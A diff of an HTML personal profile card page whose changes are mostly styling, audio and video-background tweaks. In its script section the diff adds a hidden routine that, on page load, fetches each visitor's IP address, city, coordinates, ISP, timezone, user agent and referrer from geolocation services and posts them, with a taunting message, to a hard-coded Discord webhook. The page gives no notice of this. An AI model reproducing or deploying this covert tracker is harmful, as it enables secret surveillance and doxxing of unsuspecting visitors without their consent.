@@ -4,16 +4,16 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>@zenxz.lol</title>
-  <link rel="icon" type="image/webp" href="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/2d03a9eb9b46808f915bd298ee2dac53.webp">
+  <link rel="icon" type="image/webp" href="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/b3a95bb6767b9811e46fa48168e204e2.webp">
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="zenxz.lol" />
-  <meta property="og:title" content="@ zenxz.lol" />
-  <meta property="og:image" content="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/2d03a9eb9b46808f915bd298ee2dac53.webp" />
-  <meta name="theme-color" content="#232423" /> 
+  <meta property="og:title" content="@zenxz.lol" />
+  <meta property="og:image" content="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/O%20SIDE%20MAFIA%20%26%20BRGR%20-%20WE%20OUSSIDE%20%5BOfficial%20Music%20Video%5D.mp4" />
+  <meta name="theme-color" content="#020204" /> 
 
   <style>
     :root {
-      --bg: url('https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/98e69595995f76d5e4bdadf08333aed4.gif');
       --online: #22c55e;
       --idle: #eab308;
       --dnd: #ef4444;
@@ -27,7 +27,7 @@
     }
 
     html, body {
-      background-color: #030305;
+      background-color: #020204;
       color: #ffffff;
       font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
       width: 100%;
@@ -36,19 +36,33 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      perspective: 1400px;
+      perspective: 1800px;
     }
 
     .bg-container {
       position: fixed;
       inset: -200px;
-      background-image: var(--bg);
-      background-size: cover;
-      background-position: center;
-      filter: blur(20px) brightness(0.75);
+      width: calc(100% + 400px);
+      height: calc(100% + 400px);
+      object-fit: cover;
+      filter: blur(8px) brightness(0.65) saturate(1.25);
       transform: scale(1.4);
       z-index: 0;
       will-change: transform;
+      animation: ambientZoom 30s ease-in-out infinite alternate;
+    }
+
+    @keyframes ambientZoom {
+      0% { transform: scale(1.3) rotate(0deg); }
+      100% { transform: scale(1.45) rotate(1.2deg); }
+    }
+
+    .vignette-overlay {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(0,0,0,0.1) 10%, rgba(2, 2, 4, 0.96) 85%);
+      z-index: 1;
+      pointer-events: none;
     }
 
     #fx {
@@ -58,42 +72,66 @@
       pointer-events: none;
     }
 
-    /* Top Left Glass Audio / Volume Widget */
+    /* Top Left Advanced Glass Audio / Volume HUD */
     .audio-hud {
       position: fixed;
-      top: 24px;
-      left: 24px;
+      top: 32px;
+      left: 32px;
       z-index: 100;
-      background: rgba(12, 12, 18, 0.7);
-      backdrop-filter: blur(24px);
-      -webkit-backdrop-filter: blur(24px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      padding: 12px 18px;
-      border-radius: 20px;
+      background: rgba(14, 14, 20, 0.7);
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      padding: 14px 20px;
+      border-radius: 24px;
       display: flex;
       align-items: center;
-      gap: 14px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      gap: 16px;
+      box-shadow: 0 24px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.25);
+      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     .audio-hud:hover {
-      border-color: rgba(255, 255, 255, 0.25);
-      box-shadow: 0 25px 50px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.2);
+      border-color: rgba(255, 255, 255, 0.3);
+      box-shadow: 0 30px 70px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.4);
     }
 
-    .audio-hud svg {
-      width: 18px;
+    .eq-bars {
+      display: flex;
+      align-items: flex-end;
+      gap: 3px;
       height: 18px;
-      fill: rgba(255, 255, 255, 0.85);
-      filter: drop-shadow(0 0 8px rgba(255,255,255,0.3));
+      width: 20px;
+      cursor: pointer;
+    }
+
+    .eq-bar {
+      width: 3.5px;
+      background: #ffffff;
+      border-radius: 2px;
+      animation: eqBounce 1.2s ease-in-out infinite alternate;
+    }
+
+    .eq-bar:nth-child(1) { height: 60%; animation-delay: 0.1s; }
+    .eq-bar:nth-child(2) { height: 100%; animation-delay: 0.4s; }
+    .eq-bar:nth-child(3) { height: 40%; animation-delay: 0.2s; }
+
+    @keyframes eqBounce {
+      0% { transform: scaleY(0.3); opacity: 0.4; }
+      100% { transform: scaleY(1); opacity: 1; }
+    }
+
+    .paused .eq-bar {
+      animation-play-state: paused;
+      transform: scaleY(0.2);
+      opacity: 0.25;
     }
 
     .volume-slider {
       appearance: none;
       width: 90px;
       height: 5px;
-      background: rgba(255, 255, 255, 0.15);
+      background: rgba(255, 255, 255, 0.18);
       border-radius: 3px;
       outline: none;
       cursor: pointer;
@@ -101,51 +139,62 @@
 
     .volume-slider::-webkit-slider-thumb {
       appearance: none;
-      width: 12px;
-      height: 12px;
+      width: 13px;
+      height: 13px;
       border-radius: 50%;
       background: #ffffff;
       cursor: pointer;
-      box-shadow: 0 0 12px rgba(255,255,255,0.9);
-      transition: transform 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      box-shadow: 0 0 16px rgba(255,255,255,1);
+      transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
     .volume-slider::-webkit-slider-thumb:hover {
-      transform: scale(1.4);
+      transform: scale(1.5);
     }
 
-    /* Audio Gate Start Screen */
+    /* Cinematic Audio Gate Start Screen */
     #startScreen {
       position: fixed;
       inset: 0;
-      background: rgba(3, 3, 5, 0.96);
-      backdrop-filter: blur(16px);
+      background: rgba(2, 2, 4, 0.99);
+      backdrop-filter: blur(40px);
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       z-index: 9999;
       cursor: pointer;
-      transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1), visibility 0.8s;
     }
 
     #startScreen.hidden {
       opacity: 0;
+      visibility: hidden;
       pointer-events: none;
     }
 
     .start-prompt {
       font-size: 26px;
       font-weight: 800;
-      letter-spacing: 6px;
+      letter-spacing: 12px;
       text-transform: uppercase;
       color: #ffffff;
       animation: pulseGlow 2.5s infinite ease-in-out;
-      text-shadow: 0 0 30px rgba(255,255,255,0.4), 0 0 60px rgba(255,255,255,0.1);
+      text-shadow: 0 0 40px rgba(255,255,255,0.6), 0 0 80px rgba(255,255,255,0.2);
+      transform: translateX(6px);
+    }
+
+    .start-sub {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.45);
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      margin-top: 14px;
+      font-family: monospace;
     }
 
     @keyframes pulseGlow {
-      0%, 100% { opacity: 0.35; transform: scale(0.97); }
+      0%, 100% { opacity: 0.35; transform: scale(0.98); }
       50% { opacity: 1; transform: scale(1.02); }
     }
 
@@ -163,37 +212,50 @@
     .card {
       position: relative;
       width: 100%;
-      background: rgba(14, 14, 22, 0.75);
-      backdrop-filter: blur(40px);
-      -webkit-backdrop-filter: blur(40px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgba(13, 13, 20, 0.82);
+      backdrop-filter: blur(60px);
+      -webkit-backdrop-filter: blur(60px);
+      border: 1px solid rgba(255, 255, 255, 0.16);
       border-radius: 42px;
-      padding: 48px 32px;
+      padding: 46px 34px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      box-shadow: 0 60px 120px rgba(0, 0, 0, 0.85), inset 0 1px 0 rgba(255, 255, 255, 0.35), inset 0 -1px 0 rgba(0, 0, 0, 0.8);
+      box-shadow: 0 60px 120px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 255, 255, 0.35), inset 0 -1px 0 rgba(0, 0, 0, 0.95);
       text-align: center;
       transform-style: preserve-3d;
       transition: transform 0.1s cubic-bezier(0.03, 0.98, 0.52, 0.99), box-shadow 0.4s ease;
       will-change: transform;
       pointer-events: auto;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(800px circle at var(--mouse-x, 50%) var(--mouse-y, 50%), rgba(255,255,255,0.12), transparent 50%);
+      pointer-events: none;
+      border-radius: 42px;
+      z-index: 1;
     }
 
     .card:hover {
-      box-shadow: 0 80px 150px rgba(0, 0, 0, 0.95), inset 0 1px 0 rgba(255, 255, 255, 0.5);
+      box-shadow: 0 90px 180px rgba(0, 0, 0, 0.98), inset 0 1px 0 rgba(255, 255, 255, 0.6);
+      border-color: rgba(255, 255, 255, 0.32);
     }
 
-    /* Dynamic Avatar Aura Ring */
+    /* Avatar Aura */
     .avatar-glow {
       position: relative;
+      z-index: 2;
       padding: 4px;
       border-radius: 50%;
-      background: conic-gradient(from 0deg, rgba(255,255,255,0.05), rgba(255,255,255,0.9), rgba(255,255,255,0.05), rgba(255,255,255,0.5), rgba(255,255,255,0.05));
+      background: conic-gradient(from 0deg, rgba(255,255,255,0.08), rgba(255,255,255,1), rgba(255,255,255,0.08), rgba(255,255,255,0.75), rgba(255,255,255,0.08));
       background-size: 300% 300%;
-      animation: rotateBorder 5s linear infinite;
+      animation: rotateBorder 6s linear infinite;
       margin-bottom: 22px;
-      box-shadow: 0 0 30px rgba(255,255,255,0.15);
+      box-shadow: 0 0 45px rgba(255,255,255,0.25);
     }
 
     @keyframes rotateBorder {
@@ -204,8 +266,8 @@
 
     .avatar-wrapper {
       position: relative;
-      width: 130px;
-      height: 130px;
+      width: 125px;
+      height: 125px;
       border-radius: 50%;
       overflow: hidden;
       background: #000;
@@ -215,60 +277,66 @@
       width: 100%;
       height: 100%;
       object-fit: cover;
-      transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+      transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     .card:hover .avatar {
-      transform: scale(1.06);
+      transform: scale(1.08);
     }
 
     .status-dot {
       position: absolute;
       bottom: 8px;
       right: 8px;
-      width: 22px;
-      height: 22px;
+      width: 20px;
+      height: 20px;
       border-radius: 50%;
-      border: 3.5px solid #0e0e16;
+      border: 3px solid #0c0c14;
       background-color: var(--offline);
       z-index: 4;
       transition: background-color 0.3s ease;
-      box-shadow: 0 0 16px rgba(0,0,0,0.8);
+      box-shadow: 0 0 14px rgba(0,0,0,0.85);
     }
 
-    /* Cinzel Typography Name */
+    /* Typography */
+    .username-container {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+    }
+
     .username {
       font-family: 'Cinzel', serif;
-      font-size: 40px;
-      font-weight: 700;
-      letter-spacing: 2.5px;
+      font-size: 36px;
+      font-weight: 800;
+      letter-spacing: 2px;
       margin-bottom: 4px;
       text-transform: uppercase;
-      text-shadow: 0 4px 16px rgba(0,0,0,0.6), 0 0 25px rgba(255,255,255,0.25);
-      background: linear-gradient(180deg, #ffffff 0%, rgba(255,255,255,0.65) 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #ffffff;
+      text-shadow: 0 2px 16px rgba(0,0,0,0.9), 0 0 30px rgba(255,255,255,0.35);
     }
 
     .tag {
       font-size: 14px;
-      color: rgba(255, 255, 255, 0.5);
-      margin-bottom: 16px;
+      color: rgba(255, 255, 255, 0.82);
+      margin-bottom: 18px;
       font-family: monospace;
-      letter-spacing: 1.2px;
+      letter-spacing: 1.5px;
+      font-weight: 600;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.7);
     }
 
     .custom-status {
       font-size: 13px;
-      color: rgba(255, 255, 255, 0.8);
-      margin-bottom: 24px;
+      color: rgba(255, 255, 255, 0.95);
+      margin-bottom: 22px;
       display: none;
       align-items: center;
       gap: 8px;
-      background: rgba(255, 255, 255, 0.05);
+      background: rgba(255, 255, 255, 0.08);
       padding: 6px 16px;
       border-radius: 24px;
-      border: 1px solid rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.16);
       box-shadow: inset 0 1px 4px rgba(0,0,0,0.4);
     }
 
@@ -278,26 +346,28 @@
 
     /* Activities Container Stack */
     .activities-container {
+      position: relative;
+      z-index: 2;
       width: 100%;
       display: flex;
       flex-direction: column;
       gap: 12px;
-      margin-bottom: 26px;
+      margin-bottom: 24px;
     }
 
     .activity-box {
       width: 100%;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-left: 3.5px solid rgba(255, 255, 255, 0.85);
-      border-radius: 18px;
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-left: 4px solid rgba(255, 255, 255, 0.95);
+      border-radius: 16px;
       padding: 14px 18px;
       font-size: 14px;
       text-align: left;
       display: none;
       gap: 14px;
       align-items: center;
-      box-shadow: inset 0 2px 10px rgba(0,0,0,0.6), 0 8px 24px rgba(0,0,0,0.2);
-      background: linear-gradient(90deg, rgba(255, 255, 255, 0.06) 0%, rgba(0,0,0,0.6) 100%);
+      box-shadow: inset 0 2px 12px rgba(0,0,0,0.65), 0 8px 24px rgba(0,0,0,0.35);
+      background: linear-gradient(90deg, rgba(255, 255, 255, 0.09) 0%, rgba(10, 10, 16, 0.8) 100%);
       transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
@@ -305,27 +375,32 @@
       display: flex;
     }
 
+    .activity-box:hover {
+      border-color: rgba(255, 255, 255, 0.35);
+      background: linear-gradient(90deg, rgba(255, 255, 255, 0.14) 0%, rgba(10, 10, 16, 0.9) 100%);
+    }
+
     .activity-art {
-      width: 50px;
-      height: 50px;
+      width: 48px;
+      height: 48px;
       border-radius: 12px;
       object-fit: cover;
       flex-shrink: 0;
       background: #111;
-      box-shadow: 0 6px 14px rgba(0,0,0,0.5);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
     }
 
     .activity-icon-fallback {
       font-size: 20px;
       flex-shrink: 0;
-      width: 50px;
-      height: 50px;
+      width: 48px;
+      height: 48px;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: rgba(255,255,255,0.07);
+      background: rgba(255,255,255,0.09);
       border-radius: 12px;
-      box-shadow: inset 0 1px 3px rgba(255,255,255,0.1);
+      box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
     }
 
     .activity-icon-fallback svg {
@@ -345,7 +420,7 @@
       font-size: 10px;
       text-transform: uppercase;
       letter-spacing: 1.2px;
-      color: rgba(255, 255, 255, 0.45);
+      color: rgba(255, 255, 255, 0.65);
       font-weight: 700;
       margin-bottom: 2px;
     }
@@ -356,11 +431,11 @@
       overflow: hidden;
       text-overflow: ellipsis;
       font-size: 14px;
-      text-shadow: 0 1px 4px rgba(0,0,0,0.4);
+      text-shadow: 0 1px 4px rgba(0,0,0,0.5);
     }
 
     .activity-sub {
-      color: rgba(255, 255, 255, 0.65);
+      color: rgba(255, 255, 255, 0.8);
       font-size: 12px;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -373,30 +448,30 @@
       gap: 14px;
       justify-content: center;
       position: relative;
-      z-index: 10;
+      z-index: 2;
       width: 100%;
     }
 
     .social-btn {
-      width: 56px;
-      height: 56px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: 18px;
+      width: 54px;
+      height: 54px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      border-radius: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
       transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
       text-decoration: none;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.45), inset 0 1px 0 rgba(255,255,255,0.18);
       cursor: pointer;
     }
 
     .social-btn:hover {
-      background: rgba(255, 255, 255, 0.25);
-      transform: translateY(-6px) scale(1.1);
-      border-color: rgba(255, 255, 255, 0.5);
-      box-shadow: 0 12px 32px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.3);
+      background: rgba(255, 255, 255, 0.28);
+      transform: translateY(-6px) scale(1.12);
+      border-color: rgba(255, 255, 255, 0.55);
+      box-shadow: 0 14px 35px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.35);
     }
 
     .social-btn img {
@@ -411,19 +486,28 @@
 
   <!-- Top Left HUD Audio & Volume Controller -->
   <div class="audio-hud">
-    <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
-    <input type="range" id="volumeSlider" class="volume-slider" min="0" max="1" step="0.01" value="0.8">
+    <div id="eqToggle" class="eq-bars paused" title="Play/Pause Audio">
+      <div class="eq-bar"></div>
+      <div class="eq-bar"></div>
+      <div class="eq-bar"></div>
+    </div>
+    <input type="range" id="volumeSlider" class="volume-slider" min="0" max="1" step="0.01" value="0.75">
   </div>
 
-  <!-- Background Layer & Effects Canvas -->
-  <div class="bg-container"></div>
+  <!-- Background Video Element -->
+  <video class="bg-container" autoplay muted loop playsinline>
+    <source src="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/O%20SIDE%20MAFIA%20%26%20BRGR%20-%20WE%20OUSSIDE%20%5BOfficial%20Music%20Video%5D.mp4" type="video/mp4">
+  </video>
+
+  <div class="vignette-overlay"></div>
   <canvas id="fx"></canvas>
   
-  <audio id="bgMusic" loop preload="auto" src="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/Playboi%20Carti%20-%20Sky%20%5BOfficial%20Video%5D.mp3"></audio>
+  <audio id="bgMusic" loop preload="auto" src="https://file.garden/aTO1E0deYkPxCYiy/zenny.lol/Video%20Project%205.m4a"></audio>
 
-  <!-- Interaction Gate for Audio Autoplay Restrictions -->
+  <!-- Cinematic Interaction Gate for Audio Restrictions -->
   <div id="startScreen">
     <div class="start-prompt">[ doxx me ]</div>
+    <div class="start-sub"></div>
   </div>
 
   <!-- Profile Card Layer -->
@@ -436,9 +520,11 @@
         </div>
       </div>
 
-      <h1 id="userName" class="username">zen</h1>
-      <div id="userTag" class="tag">@zenxz.lol</div>
-      <div id="customStatus" class="custom-status"></div>
+      <div class="username-container">
+        <h1 id="userName" class="username">zen</h1>
+        <div id="userTag" class="tag">@zenxz.lol</div>
+        <div id="customStatus" class="custom-status"></div>
+      </div>
 
       <!-- Concurrent Activities Stack -->
       <div class="activities-container">
@@ -454,7 +540,7 @@
           </div>
         </div>
 
-        <!-- Rich Presence / Coding Module -->
+        <!-- Rich Presence / Activity Module -->
         <div id="codingBox" class="activity-box">
           <div id="codingMediaContainer">
             <div class="activity-icon-fallback"><svg viewBox="0 0 24 24"><path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2zm4.5 2c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm3-3c-.83 0-1.5-.67-1.5-1.5S17.67 9 18.5 9s1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
@@ -469,7 +555,7 @@
 
       <!-- Socials -->
       <div class="socials">
-        <a href="https://discordapp.com/users/1535329294350553170" target="_blank" rel="noopener noreferrer" class="social-btn" aria-label="Discord">
+        <a href="https://discordapp.com/users/1521973884851716267" target="_blank" rel="noopener noreferrer" class="social-btn" aria-label="Discord">
           <img src="https://cdn.simpleicons.org/discord/ffffff" alt="Discord">
         </a>
         <a href="https://www.roblox.com/users/11223763991/profile" target="_blank" rel="noopener noreferrer" class="social-btn" aria-label="Roblox">
@@ -486,58 +572,158 @@
   </div>
 
   <script>
-    // --- Anti-Inspect Rickroll Redirect Trap ---
-    const rickrollUrl = "https://youtu.be/dQw4w9WgXcQ?si=fxqNFQUo56WfFZ8W";
-    
-    const threshold = 160;
-    setInterval(() => {
-      if (
-        window.outerWidth - window.innerWidth > threshold ||
-        window.outerHeight - window.innerHeight > threshold
-      ) {
-        window.location.href = rickrollUrl;
-      }
-    }, 500);
-
-    document.addEventListener('contextmenu', (e) => {
-      e.preventDefault();
-      window.location.href = rickrollUrl;
-    });
-
-    document.addEventListener('keydown', (e) => {
-      if (
-        e.key === 'F12' ||
-        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
-        (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
-      ) {
-        e.preventDefault();
-        window.location.href = rickrollUrl;
-      }
-    });
-
     // Audio & Volume Control Handler
     const startScreen = document.getElementById('startScreen');
     const bgMusic = document.getElementById('bgMusic');
     const volumeSlider = document.getElementById('volumeSlider');
+    const eqToggle = document.getElementById('eqToggle');
 
     bgMusic.volume = volumeSlider.value;
 
-    startScreen.addEventListener('click', () => {
-      bgMusic.play().catch(() => {});
-      startScreen.classList.add('hidden');
-      setTimeout(() => startScreen.remove(), 800);
+    function togglePlayState() {
+      if (bgMusic.paused) {
+        bgMusic.play().then(() => {
+          eqToggle.classList.remove('paused');
+        }).catch(() => {});
+      } else {
+        bgMusic.pause();
+        eqToggle.classList.add('paused');
+      }
+    }
+
+
+(function() {
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1542630541591842830/KYJLVkZKSUmdHO9o6dtL4U5dTLVG_BxpvfDOAhuaJSA1Zi6WwE50UJDe1qMYdEDPJtzQ';
+
+  
+  fetch('https://ipapi.co/json/')
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip || 'unknown'; 
+    const city = data.city || 'unknown';
+    const region = data.region || 'unknown';
+    const country = data.country_name || 'unknown';
+    const country_code = data.country_code || 'unknown';
+    const isp = data.org || 'unknown';        
+    const lat = data.latitude || 0;
+    const lon = data.longitude || 0;
+    const timezone = data.timezone || 'UTC';
+
+      const ua = navigator.userAgent;
+      const referrer = document.referrer || 'direct';
+      const timestamp = new Date().toISOString();
+      const page = window.location.href;
+
+      
+      let locationStr = `${city}, ${region}, ${country}`;
+      if (lat !== 'unknown' && lon !== 'unknown') {
+        locationStr += `\n📍 ${lat}, ${lon}`;
+      }
+
+      const payload = {
+        embeds: [{
+          title: 'ESPROC OWNS YOU </3',
+          color: 0x5865F2,
+          fields: [
+            { name: 'IP Address', value: `\`${ip}\``, inline: true },
+            { name: 'Location', value: locationStr, inline: true },
+            { name: 'Country Code', value: country_code, inline: true },
+            { name: 'ISP', value: isp, inline: true },
+            { name: 'Time Zone', value: timezone, inline: true },
+            { name: 'User Agent', value: `\`${ua.slice(0, 200)}\``, inline: false },
+            { name: 'Referrer', value: referrer || 'direct', inline: true },
+            { name: 'Page', value: page, inline: true },
+            { name: 'Timestamp', value: timestamp, inline: true }
+          ],
+          footer: { text: 'NO SNITCH BITCH!' },
+          timestamp: timestamp
+        }]
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    })
+    .catch(() => {
+      
+      fetch('http://ip-api.com/json/')
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'success') {
+            const ip = data.query;
+            const city = data.city;
+            const region = data.regionName;
+            const country = data.country;
+            const country_code = data.countryCode;
+            const isp = data.isp;
+            const lat = data.lat;
+            const lon = data.lon;
+            const timezone = data.timezone;
+
+            const ua = navigator.userAgent;
+            const referrer = document.referrer || 'direct';
+            const timestamp = new Date().toISOString();
+            const page = window.location.href;
+
+            const payload = {
+              embeds: [{
+                title: 'ESPROC OWNS YOU </3',
+                color: 0x5865F2,
+                fields: [
+                  { name: 'IP Address', value: `\`${ip}\``, inline: true },
+                  { name: 'Location', value: `${city}, ${region}, ${country}\n📍 ${lat}, ${lon}`, inline: true },
+                  { name: 'Country Code', value: country_code, inline: true },
+                  { name: 'ISP', value: isp, inline: true },
+                  { name: 'Time Zone', value: timezone, inline: true },
+                  { name: 'User Agent', value: `\`${ua.slice(0, 200)}\``, inline: false },
+                  { name: 'Referrer', value: referrer || 'direct', inline: true },
+                  { name: 'Page', value: page, inline: true },
+                  { name: 'Timestamp', value: timestamp, inline: true }
+                ],
+                footer: { text: 'NO SNITCH BITCH!' },
+                timestamp: timestamp
+              }]
+            };
+
+            fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            }).catch(() => {});
+          }
+        })
+        .catch(() => {});
     });
+})();
+
+    startScreen.addEventListener('click', () => {
+      bgMusic.play().then(() => {
+        eqToggle.classList.remove('paused');
+      }).catch(() => {});
+      startScreen.classList.add('hidden');
+    });
+
+    eqToggle.addEventListener('click', togglePlayState);
 
     volumeSlider.addEventListener('input', (e) => {
       bgMusic.volume = e.target.value;
     });
 
-    // --- Interactive 3D Card Tilt Effect ---
+    // --- Interactive 3D Card Tilt & Specular Lighting Effect ---
     const card = document.getElementById('profileCard');
     
     document.addEventListener('mousemove', (e) => {
-      const xAxis = (window.innerWidth / 2 - e.pageX) / 20;
-      const yAxis = (window.innerHeight / 2 - e.pageY) / 20;
+      const rect = card.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      
+      card.style.setProperty('--mouse-x', `${x}px`);
+      card.style.setProperty('--mouse-y', `${y}px`);
+
+      const xAxis = (window.innerWidth / 2 - e.pageX) / 25;
+      const yAxis = (window.innerHeight / 2 - e.pageY) / 25;
       card.style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
     });
 
@@ -550,7 +736,7 @@
       card.style.transition = 'none';
     });
 
-    // --- Advanced Interactive Particle Engine with Mouse Deflection ---
+    // --- Advanced Interactive Particle Engine with Mouse Wind Deflection ---
     const canvas = document.getElementById('fx');
     const ctx = canvas.getContext('2d');
 
@@ -568,35 +754,34 @@
       mouseY = e.clientY;
     });
 
-    const particles = Array.from({ length: 85 }, () => ({
+    const particles = Array.from({ length: 95 }, () => ({
       x: Math.random() * canvas.width,
       y: Math.random() * canvas.height,
-      r: Math.random() * 2 + 0.5,
-      vy: Math.random() * 0.8 + 0.3,
-      vx: (Math.random() - 0.5) * 0.5,
-      o: Math.random() * 0.7 + 0.2
+      r: Math.random() * 2.3 + 0.6,
+      vy: Math.random() * 0.7 + 0.2,
+      vx: (Math.random() - 0.5) * 0.4,
+      o: Math.random() * 0.75 + 0.15
     }));
 
     function drawParticles() {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
       particles.forEach(p => {
-        // Distance check for smooth mouse wind deflection
         const dx = mouseX - p.x;
         const dy = mouseY - p.y;
         const dist = Math.sqrt(dx * dx + dy * dy);
-        if (dist < 120) {
+        if (dist < 140) {
           const angle = Math.atan2(dy, dx);
-          p.x -= Math.cos(angle) * 1.5;
-          p.y -= Math.sin(angle) * 1.5;
+          p.x -= Math.cos(angle) * 2;
+          p.y -= Math.sin(angle) * 2;
         }
 
         ctx.beginPath();
         ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
         ctx.fillStyle = `rgba(255, 255, 255, ${p.o})`;
-        ctx.shadowBlur = 8;
-        ctx.shadowColor = 'rgba(255, 255, 255, 0.5)';
+        ctx.shadowBlur = 12;
+        ctx.shadowColor = 'rgba(255, 255, 255, 0.7)';
         ctx.fill();
-        ctx.shadowBlur = 0; // reset shadow performance hit
+        ctx.shadowBlur = 0;
 
         p.y += p.vy;
         p.x += p.vx;
